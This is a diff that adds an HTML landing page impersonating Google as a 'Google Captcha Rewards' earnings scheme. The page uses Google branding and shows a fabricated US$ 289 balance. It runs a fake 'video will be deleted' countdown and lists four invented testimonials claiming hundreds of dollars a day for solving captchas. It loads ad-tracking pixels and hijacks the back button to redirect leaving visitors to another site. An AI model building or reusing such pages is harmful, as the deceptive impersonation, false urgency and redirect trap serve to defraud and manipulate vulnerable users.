@@ -1,0 +1,157 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Google Captcha - Withdraw Guide</title>
+  <link rel="icon" type="image/x-icon" href="https://www.google.com/favicon.ico">
+  <script src="https://cdn.tailwindcss.com"></script>
+  
+  <!-- TikTok Pixel -->
+  <script>
+    window.tikTokPixelId = "696fb129362f5d73d7ddd412";
+    var a = document.createElement("script");
+    a.setAttribute("async", "");
+    a.setAttribute("defer", "");
+    a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel-tiktok.js");
+    document.head.appendChild(a);
+  </script>
+  
+  <!-- UTMify -->
+  <script
+    src="https://cdn.utmify.com.br/scripts/utms/latest.js"
+    data-utmify-prevent-xcod-sck
+    data-utmify-prevent-subids
+    async
+    defer
+  ></script>
+  
+  <style>
+    html, body { background-color: #f8f9fa; }
+    @keyframes fadeInUp { from { opacity: 0; transform: translateY(20px); } to { opacity: 1; transform: translateY(0); } }
+    .animate-fadeInUp { animation: fadeInUp 0.6s cubic-bezier(0.16, 1, 0.3, 1) forwards; }
+    .video-shadow { box-shadow: 0 10px 30px rgba(0,0,0,0.1); }
+    .comment-card { transition: all 0.3s ease; }
+    .comment-card:hover { background-color: #f1f3f4; }
+  </style>
+</head>
+<body class="min-h-screen bg-gray-100 flex flex-col items-center">
+  <div class="w-full max-w-md flex flex-col bg-white min-h-screen">
+    <!-- Header -->
+    <div class="flex justify-between items-center px-4 py-4">
+      <div class="flex items-center gap-2">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/c/c1/Google_Logo_G_stack_2015.png" class="w-10 h-10 object-contain" alt="Google" onerror="this.onerror=null;this.src='https://www.google.com/favicon.ico';">
+        <div class="flex flex-col">
+          <span class="text-[19px] font-bold text-gray-800 leading-tight">Google</span>
+          <span class="text-[11px] font-medium text-gray-500 leading-tight">Rewards</span>
+        </div>
+      </div>
+      <div class="border-2 border-dashed border-[#4285F4] rounded-lg px-2.5 py-1.5 flex items-center gap-1.5">
+        <span class="text-[9px] text-gray-500 font-medium uppercase leading-tight">BALANCE:</span>
+        <span class="text-lg font-bold text-[#4285F4]">US$ 289</span>
+      </div>
+    </div>
+
+    <!-- Video Card -->
+    <div class="mx-4 bg-white rounded-2xl border border-gray-200 overflow-hidden video-shadow animate-fadeInUp">
+      <div class="text-center py-6 px-5 bg-gradient-to-b from-gray-50 to-white border-b border-gray-100">
+        <p class="text-gray-900 text-xl font-black leading-tight tracking-tight">🚨 ATTENTION! Watch the video until the end to understand how to withdraw your available balance. ⬇️</p>
+        <div class="flex items-center justify-center gap-2 mt-4">
+          <span class="flex h-2 w-2 rounded-full bg-red-500 animate-pulse"></span>
+          <p id="timer" class="text-gray-500 text-sm font-bold uppercase tracking-widest">6M views - Video will be deleted in 7:24</p>
+        </div>
+      </div>
+
+      <!-- Video Player -->
+      <div id="video-container" class="relative group">
+        <vturb-smartplayer id="vid-67422dad6fbe5b000bdb1ab0" style="display: block; margin: 0 auto; width: 100%; "></vturb-smartplayer>
+      </div>
+
+      <div class="text-sm text-center text-gray-400 py-4 px-4 font-medium flex items-center justify-center gap-2">
+        <svg class="w-4 h-4" fill="currentColor" viewBox="0 0 24 24"><path d="M3 9v6h4l5 5V4L7 9H3zm13.5 3c0-1.77-1.02-3.29-2.5-4.03v8.05c1.48-.73 2.5-2.25 2.5-4.02zM14 3.23v2.06c2.89.86 5 3.54 5 6.71s-2.11 5.85-5 6.71v2.06c4.01-.91 7-4.49 7-8.77s-2.99-7.86-7-8.77z"/></svg>
+        Make sure your sound is on
+      </div>
+    </div>
+
+    <!-- Comments Section -->
+    <div class="mx-4 mt-6 bg-white rounded-2xl border border-gray-200 overflow-hidden video-shadow mb-8 animate-fadeInUp" style="animation-delay: 0.2s; opacity: 0; animation-fill-mode: forwards;">
+      <div class="flex items-center justify-between px-5 py-4 border-b border-gray-100 bg-gray-50/50">
+        <div class="flex items-center gap-2">
+          <span class="text-gray-900 font-black text-lg">Comments</span>
+          <span class="bg-gray-200 text-gray-600 px-2.5 py-0.5 rounded-full text-xs font-bold">93</span>
+        </div>
+        <img src="https://upload.wikimedia.org/wikipedia/commons/c/c1/Google_Logo_G_stack_2015.png" class="w-6 h-6 object-contain" alt="Google" onerror="this.onerror=null;this.src='https://www.google.com/favicon.ico';">
+      </div>
+      <div id="comments" class="px-5"></div>
+    </div>
+
+    <!-- Footer -->
+    <footer class="flex flex-col items-center gap-2 py-6 px-4">
+      <p class="text-gray-400 text-xs">© 2025 Google Captcha Rewards</p>
+      <div class="flex gap-2 text-xs">
+        <a href="#" class="text-gray-400 underline">Privacy Policy</a>
+        <span class="text-gray-300">|</span>
+        <a href="#" class="text-gray-400 underline">Terms of Use</a>
+      </div>
+    </footer>
+  </div>
+
+  <script>
+    // Load video player
+    var s = document.createElement("script");
+    s.src = "https://scripts.converteai.net/7f440f16-2b3f-4e78-b9c9-09a104b2493d/players/67422dad6fbe5b000bdb1ab0/v4/player.js";
+    s.async = true;
+    document.head.appendChild(s);
+
+    // Timer
+    let timeLeft = 7 * 60 + 24;
+    const timerEl = document.getElementById('timer');
+    setInterval(() => {
+      if (timeLeft > 0) {
+        timeLeft--;
+        const mins = Math.floor(timeLeft / 60);
+        const secs = (timeLeft % 60).toString().padStart(2, '0');
+        timerEl.textContent = `6M views - Video will be deleted in ${mins}:${secs}`;
+      }
+    }, 1000);
+
+    // Back redirect
+    history.pushState(null, null, location.href);
+    window.onpopstate = function() {
+      history.pushState(null, null, location.href);
+      window.location.href = "https://v0-roleta-de-descontos-tik-tok.vercel.app/";
+    };
+
+    // Comments
+    const comments = [
+      { username: "Sofia Garcia", avatar: "https://images.unsplash.com/photo-1494790108377-be9c29b29330?w=100&q=80", text: "Guys, I'm impressed!!! I watched the full video and got access to the tool. I used it for about 20 minutes and already managed to withdraw US$277. I recommend you watch the full video to get access to the tool as well.", likes: 247, date: "7 min" },
+      { username: "Carlos Dal Belo", avatar: "https://images.unsplash.com/photo-1507003211169-0a1dd7228f2d?w=100&q=80", text: "I've been using this new Google tool for three months now, and I haven't stopped receiving transfers every day since, just for helping verify captchas. I'm earning at least $200 a day.", likes: 183, date: "15 min" },
+      { username: "Bernardo Torres", avatar: "https://images.unsplash.com/photo-1500648767791-00dcc994a43e?w=100&q=80", text: "I'm making so much money with Google Captcha that I'm going to be able to buy my new scooter, try it out people because it really works...", likes: 156, date: "18 min" },
+      { username: "Hanna Larissa", avatar: "https://images.unsplash.com/photo-1517841905240-472988babdf9?w=100&q=80", text: "Hi everyone! I highly recommend this new Google tool, it's perfect. The money hits your account instantly. Oh my God, wonderful! Thank you, Google.", likes: 312, date: "1h" },
+    ];
+
+    const commentsContainer = document.getElementById('comments');
+    comments.forEach(c => {
+      commentsContainer.innerHTML += `
+        <div class="py-3 border-b border-gray-100">
+          <div class="flex gap-3">
+            <img src="${c.avatar}" alt="${c.username}" class="w-10 h-10 rounded-full object-cover flex-shrink-0">
+            <div class="flex-1">
+              <span class="text-[13px] text-gray-400">${c.username}</span>
+              <p class="text-[15px] text-gray-700 mt-0.5 leading-snug">${c.text}</p>
+              <div class="flex items-center gap-4 mt-1.5">
+                <span class="text-xs text-gray-500">${c.date}</span>
+                <button class="text-xs text-gray-500 font-medium">Reply</button>
+              </div>
+            </div>
+            <div class="flex flex-col items-center gap-0.5 flex-shrink-0">
+              <svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="#9CA3AF" stroke-width="1.5"><path d="M20.84 4.61a5.5 5.5 0 0 0-7.78 0L12 5.67l-1.06-1.06a5.5 5.5 0 0 0-7.78 7.78l1.06 1.06L12 21.23l7.78-7.78 1.06-1.06a5.5 5.5 0 0 0 0-7.78z"></path></svg>
+              <span class="text-xs text-gray-500">${c.likes}</span>
+            </div>
+          </div>
+        </div>
+      `;
+    });
+  </script>
+</body>
+</html>
